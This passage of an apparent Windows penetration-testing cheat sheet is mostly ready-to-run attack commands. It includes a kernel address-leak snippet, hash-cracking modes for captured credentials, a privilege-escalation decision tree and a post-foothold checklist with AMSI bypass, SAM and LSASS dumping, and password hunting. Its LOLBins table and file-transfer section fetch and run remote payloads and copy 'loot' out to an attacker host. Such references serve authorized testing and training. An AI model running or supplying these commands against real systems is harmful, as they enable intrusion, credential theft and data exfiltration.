# The info-leak step (NtQuerySystemInformation) can be done via PowerShell P/Invoke:
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Ntdll {
    [DllImport("ntdll.dll")] public static extern int NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int ReturnLength);
}
'@
# SystemModuleInformation = 11
$size = 0x10000
$buf = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
$ret = 0
[Ntdll]::NtQuerySystemInformation(11, $buf, $size, [ref]$ret)
# Parse module list from buffer to get ntoskrnl base address
```

---

## Quick Reference: Hash Types for Hashcat

> For full hash identification, cracking strategies, and rule selection, see [password-cracking.md](password-cracking.md).

> Supplementary reference: [https://book.hacktricks.wiki](https://book.hacktricks.wiki)

| Hash Source | Hashcat Mode | Example |
|---|---|---|
| NetNTLMv2 (Responder) | `-m 5600` | Captured via LLMNR/NBT-NS |
| NTLMv1 | `-m 5500` | Captured via Responder (rare) |
| NTLM (SAM dump) | `-m 1000` | From secretsdump / SAM |
| AS-REP | `-m 18200` | From GetNPUsers |
| Kerberoast (TGS) | `-m 13100` | From GetUserSPNs |
| MSCache2 (DCC2) | `-m 2100` | Cached domain creds |
| MSSQL (2012+) | `-m 1731` | From MSSQL dumps |

---

## Quick Reference: icacls Permission Codes

| Code | Meaning |
|---|---|
| `F` | Full access |
| `M` | Modify (read, write, delete) |
| `RX` | Read and execute |
| `R` | Read only |
| `W` | Write only |
| `(I)` | Inherited from parent |
| `(OI)` | Object inherit (files in folder) |
| `(CI)` | Container inherit (subfolders) |
| `(IO)` | Inherit only (not this object) |

```powershell
# Check permissions on a file or folder
icacls "C:\path\to\target"

# Grant full control
icacls "C:\path\to\target" /grant <USERNAME>:F

# Check who can write to a directory (look for W, M, or F)
icacls "C:\Program Files\*" 2>nul | findstr /i "(F) (M) (W)" | findstr /i "everyone users authenticated"
```

---

## Quick Reference: Privilege Escalation Decision Tree

```
whoami /priv
├── SeImpersonatePrivilege → GodPotato / PrintSpoofer / JuicyPotatoNG
├── SeBackupPrivilege      → reg save SAM/SYSTEM → secretsdump (see 4.13)
├── SeRestorePrivilege     → Overwrite service binary or utilman.exe (see 4.20)
├── SeDebugPrivilege       → Dump LSASS / migrate to SYSTEM process (see 4.18)
├── SeLoadDriverPrivilege  → Load Capcom.sys → kernel exec (see 4.21)
├── SeManageVolumePrivilege → Write to System32 → DLL hijack (see 4.21b)
├── SeTakeOwnershipPrivilege → takeown sensitive files/registry (see 4.19)
└── No useful privs?
    ├── Check services       → Unquoted paths, weak perms (see 4.3)
    ├── Check scheduled tasks → Writable scripts running as SYSTEM (see 4.6)
    ├── Check AlwaysInstallElevated → MSI payload (see 4.5)
    ├── Check stored creds   → cmdkey /list → runas /savecred (see 4.7)
    ├── Check patch level    → systeminfo → kernel exploits (see 4.9)
    ├── Check ADCS           → certipy / Certify (see 2.8)
    └── Run WinPEAS / SharpUp for anything missed (see 4.1)
```

---

## Quick Reference: Post-Foothold Checklist

```
Got a shell on Windows? Run through this in order:

1. WHO AM I?
   whoami /all
   └→ Note: username, groups, privileges (SeImpersonate? SeBackup?)

2. AMSI + ETW BYPASS (before loading any PS tools)
   See section 4.10 — do this FIRST if you need PowerShell tooling

3. QUICK WINS — check these first (< 2 minutes)
   whoami /priv                     → Token abuse? (see decision tree above)
   cmdkey /list                     → Stored creds? → runas /savecred
   reg query "HKLM\...\Winlogon"   → AutoLogon password?
   type %APPDATA%\...\ConsoleHost_history.txt → PowerShell history?

4. SYSTEM CONTEXT
   systeminfo                       → OS version, patches, domain?
   ipconfig /all                    → Multiple NICs? → PIVOT (tunneling-pivoting.md)
   netstat -ano | findstr LISTENING → Internal services on 127.0.0.1?

5. DOMAIN JOINED?
   systeminfo | findstr /i "domain" → If domain joined:
   └→ Switch to active-directory-methodology.md
   └→ Identify Kerberoastable users (AD Phase 2.3/2.4b — ldapsearch/adsisearcher for SPN)
   └→ Kerberoast (AD Phase 3.1 — impacket-GetUserSPNs / Rubeus)
   └→ Auth test: impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<IP> (AD Phase 3.3)
   └→ Check ADCS (AD Phase 7)
   └→ Run BloodHound (AD Phase 2.1)

6. CREDENTIALS
   reg save HKLM\SAM sam.bak       → If admin, dump SAM (see 4.17)
   dir /s /b C:\*unattend*.xml     → Sysprep creds?
   findstr /si "password" *.xml *.ini *.config
   Check GPP: \\<DC>\SYSVOL\       → cpassword? gpp-decrypt (see 4.7 + AD Phase 2.2)
   dir /r C:\Users\<USER>\Desktop\ → Alternate Data Streams? (see 4.7.1)

7. AUTOMATED SCAN
   .\winPEASany.exe                 → Review output for anything missed
   .\SharpUp.exe audit              → Service misconfigs, writable paths

8. STILL STUCK?
   Check for internal web apps on 127.0.0.1 (port forward to test)
   Check scheduled tasks: schtasks /query /fo LIST /v
   Check DLL hijacking: writable dirs in PATH? (see 4.4)
   Try kernel exploits: systeminfo → compare patches (see 4.9)
   Re-read winPEAS output — look for red/yellow highlights
```

---

## Quick Reference: LOLBins (Living Off the Land)

> Full database: [https://lolbas-project.github.io](https://lolbas-project.github.io)

| Binary | Use Case | Example |
|---|---|---|
| `certutil.exe` | Download files, base64 decode | `certutil -urlcache -f http://<IP>/file C:\temp\file` |
| `bitsadmin.exe` | Download files | `bitsadmin /transfer j /download http://<IP>/file C:\temp\file` |
| `mshta.exe` | Execute HTA payloads | `mshta http://<IP>/payload.hta` |
| `msbuild.exe` | Execute C# inline tasks | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml` |
| `installutil.exe` | Execute .NET assemblies | `InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe` |
| `regsvr32.exe` | Execute SCT scripts | `regsvr32 /s /n /u /i:http://<IP>/file.sct scrobj.dll` |
| `rundll32.exe` | Execute DLLs, dump LSASS | `rundll32.exe comsvcs.dll, MiniDump <PID> out.dmp full` |
| `cscript/wscript` | Execute VBS/JS scripts | `cscript //nologo payload.vbs` |
| `powershell.exe` | Download + execute | `powershell -ep bypass -c "IEX(IWR http://<IP>/s.ps1)"` |
| `curl.exe` | Download files (Win 10+) | `curl.exe http://<IP>/file -o C:\temp\file` |
| `expand.exe` | Extract CAB files | `expand payload.cab C:\temp\payload.exe` |
| `esentutl.exe` | Copy locked files | `esentutl.exe /y C:\path\locked.file /d C:\temp\copy.file /o` |
| `diskshadow.exe` | Shadow copy creation | See SeBackupPrivilege (4.13) |
| `wmic.exe` | Remote exec, enum | `wmic /node:<IP> process call create "cmd /c whoami"` |
| `sc.exe` | Remote service creation | `sc \\<IP> create svc binpath= "cmd /c ..."` |
| `schtasks.exe` | Remote task execution | `schtasks /create /s <IP> /tn x /tr "cmd /c ..." /sc once` |

---

## Quick Reference: Native File Transfer (No External Tools)

> For full file transfer methods, see [file-transfers.md](file-transfers.md).

```powershell
# === DOWNLOAD TO TARGET (native cmd.exe / PowerShell) ===

# certutil (works on all Windows versions)
certutil -urlcache -f http://<ATTACKER_IP>:<PORT>/<FILE> C:\temp\<FILE>

# PowerShell (Win 7+)
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:<PORT>/<FILE>','C:\temp\<FILE>')"
powershell -c "Invoke-WebRequest http://<ATTACKER_IP>:<PORT>/<FILE> -OutFile C:\temp\<FILE>"

# curl.exe (Win 10 1803+ / Server 2019+)
curl.exe http://<ATTACKER_IP>:<PORT>/<FILE> -o C:\temp\<FILE>

# bitsadmin (all Windows versions)
bitsadmin /transfer job /download /priority high http://<ATTACKER_IP>:<PORT>/<FILE> C:\temp\<FILE>

# SMB copy (attacker runs: impacket-smbserver share /path -smb2support)
copy \\<ATTACKER_IP>\share\<FILE> C:\temp\<FILE>

# === UPLOAD FROM TARGET (native) ===

# SMB copy back to attacker share
copy C:\temp\loot.txt \\<ATTACKER_IP>\share\loot.txt

# Base64 encode and copy via clipboard/terminal (small files)
certutil -encode C:\temp\file.exe encoded.txt
type encoded.txt
# On attacker: paste → base64 -d > file.exe

# PowerShell base64 (small files)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\temp\file.exe"))
# On attacker: echo '<BASE64>' | base64 -d > file.exe

# === COMPILE ON TARGET (when you can't transfer binaries) ===
# C# compilation with csc.exe (native .NET compiler, always present)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\temp\shell.exe C:\temp\shell.cs

# VBScript execution (native, no compilation)
cscript //nologo C:\temp\payload.vbs
```
